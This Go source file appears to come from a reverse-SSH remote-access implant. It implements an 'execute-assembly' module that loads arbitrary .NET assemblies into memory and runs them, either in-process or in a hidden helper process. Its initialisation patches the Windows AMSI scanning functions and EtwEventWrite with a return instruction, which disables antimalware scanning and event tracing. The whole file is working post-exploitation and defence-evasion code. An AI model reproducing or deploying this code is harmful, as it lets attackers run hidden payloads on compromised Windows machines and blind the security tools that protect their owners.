//go:build execass && windows

package engine

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"sync"
	"time"
	"unsafe"

	"github.com/NHAS/reverse_ssh/internal/client/handlers/subsystems"
	clr "github.com/Ne0nd0g/go-clr"
	"github.com/google/shlex"
	"golang.org/x/sys/windows"
)

type platformRunner struct{}

var (
	runtimeHost *clr.ICORRuntimeHost
	assemblies  = make(map[[32]byte]*clr.MethodInfo)
	runnerMu    sync.Mutex
)

func newRunner() Runner {
	return platformRunner{}
}

func (platformRunner) Run(ctx context.Context, request Request, moduleIO subsystems.ModuleIO) error {
	if ctx == nil {
		ctx = context.Background()
	}
	if request.InProcess {
		return executeAssemblyInProcess(ctx, request, moduleIO)
	}
	return executeAssemblyOutOfProcess(ctx, request, moduleIO)
}

func executeAssemblyInProcess(ctx context.Context, request Request, moduleIO subsystems.ModuleIO) error {
	parsedArgs, err := shlex.Split(request.AssemblyArgs)
	if err != nil {
		return fmt.Errorf("failed to parse assembly arguments: %w", err)
	}

	unlock, err := lockRunner(ctx)
	if err != nil {
		return err
	}
	defer unlock()

	if err := ctx.Err(); err != nil {
		return err
	}
	if runtimeHost == nil {
		if err := initRuntimeHost(request.Runtime, moduleIO); err != nil {
			return fmt.Errorf("failed to load CLR: %w", err)
		}
	}

	hash := sha256.Sum256(request.Artifact)
	methodInfo, ok := assemblies[hash]
	if ok {
		writeLine(moduleIO, "[INF] Using cached assembly")
	} else {
		writeLine(moduleIO, "[INF] Loading assembly")
		methodInfo, err = clr.LoadAssembly(runtimeHost, request.Artifact)
		if err != nil {
			return fmt.Errorf("failed to load assembly: %w", err)
		}
		assemblies[hash] = methodInfo
	}

	if err := ctx.Err(); err != nil {
		return err
	}
	writeLine(moduleIO, "[INF] Executing assembly in current process")
	stdout, stderr := clr.InvokeAssembly(methodInfo, parsedArgs)
	if stdout != "" {
		writeBlock(moduleIO, "[INF] STDOUT:", stdout)
	}
	if stderr != "" {
		writeBlock(moduleIO.Stderr(), "[INF] STDERR:", stderr)
	}
	return ctx.Err()
}

func lockRunner(ctx context.Context) (func(), error) {
	if runnerMu.TryLock() {
		return runnerMu.Unlock, nil
	}

	ticker := time.NewTicker(100 * time.Millisecond)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return nil, ctx.Err()
		case <-ticker.C:
			if runnerMu.TryLock() {
				return runnerMu.Unlock, nil
			}
		}
	}
}

func executeAssemblyOutOfProcess(ctx context.Context, request Request, moduleIO subsystems.ModuleIO) error {
	if request.ProcessName != DefaultProcessName || request.ProcessArgs != "" || request.ParentPID != 0 {
		writeLine(moduleIO.Stderr(), "[WRN] Custom process injection flags are not supported; using isolated helper process")
	}

	executable, err := os.Executable()
	if err != nil {
		return fmt.Errorf("failed to resolve current executable: %w", err)
	}

	writeLine(moduleIO, "[INF] Starting isolated helper process")
	cmd := exec.CommandContext(ctx, executable, HelperArg)
	cmd.SysProcAttr = &windows.SysProcAttr{
		HideWindow:    true,
		CreationFlags: windows.CREATE_NO_WINDOW,
	}

	var stdoutBuf, stderrBuf bytes.Buffer
	cmd.Stdout = &stdoutBuf
	cmd.Stderr = &stderrBuf
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return fmt.Errorf("failed to open helper stdin: %w", err)
	}

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start helper process: %w", err)
	}

	helperRequest := HelperRequest{
		ArtifactBase64: base64.StdEncoding.EncodeToString(request.Artifact),
		Runtime:        request.Runtime,
		AssemblyArgs:   request.AssemblyArgs,
	}
	if err := json.NewEncoder(stdin).Encode(helperRequest); err != nil {
		_ = stdin.Close()
		killAndWait(cmd)
		return fmt.Errorf("failed to send helper request: %w", err)
	}
	_ = stdin.Close()

	err = cmd.Wait()
	if stdout := stdoutBuf.String(); stdout != "" {
		writeBlock(moduleIO, "[INF] STDOUT:", stdout)
	}
	if stderr := stderrBuf.String(); stderr != "" {
		writeBlock(moduleIO.Stderr(), "[INF] STDERR:", stderr)
	}
	if ctxErr := ctx.Err(); ctxErr != nil {
		return ctxErr
	}
	if err != nil {
		return err
	}
	return nil
}

func killAndWait(cmd *exec.Cmd) {
	if cmd.Process == nil {
		return
	}
	_ = cmd.Process.Kill()
	_ = cmd.Wait()
}

func initRuntimeHost(runtime string, moduleIO subsystems.ModuleIO) error {
	if err := patchAmsi(moduleIO); err != nil {
		return err
	}
	if err := patchEtw(moduleIO); err != nil {
		return err
	}

	host, err := clr.LoadCLR(runtime)
	if err != nil {
		return err
	}
	if err := clr.RedirectStdoutStderr(); err != nil {
		return err
	}
	runtimeHost = host
	return nil
}

func patchAmsi(moduleIO subsystems.ModuleIO) error {
	amsiDLL := windows.NewLazyDLL("amsi.dll")
	procs := []*windows.LazyProc{
		amsiDLL.NewProc("AmsiScanBuffer"),
		amsiDLL.NewProc("AmsiInitialize"),
		amsiDLL.NewProc("AmsiScanString"),
	}
	for _, proc := range procs {
		if err := patchProcedureReturn(proc, moduleIO); err != nil {
			return err
		}
	}
	return nil
}

func patchEtw(moduleIO subsystems.ModuleIO) error {
	ntdll := windows.NewLazyDLL("ntdll.dll")
	return patchProcedureReturn(ntdll.NewProc("EtwEventWrite"), moduleIO)
}

func patchProcedureReturn(proc *windows.LazyProc, moduleIO subsystems.ModuleIO) error {
	if err := proc.Find(); err != nil {
		return err
	}

	addr := proc.Addr()
	patch := byte(0xC3)
	if *(*byte)(unsafe.Pointer(addr)) == patch {
		return nil
	}

	writeLine(moduleIO, fmt.Sprintf("[INF] Patching %s", proc.Name))
	var oldProtect uint32
	if err := windows.VirtualProtect(addr, 1, windows.PAGE_READWRITE, &oldProtect); err != nil {
		return err
	}
	*(*byte)(unsafe.Pointer(addr)) = patch
	if err := windows.VirtualProtect(addr, 1, oldProtect, &oldProtect); err != nil {
		return err
	}
	return nil
}

func writeLine(writer io.Writer, line string) {
	_, _ = fmt.Fprintln(writer, line)
}

func writeBlock(writer io.Writer, header, body string) {
	_, _ = fmt.Fprintf(writer, "%s\n%s\n", header, body)
}
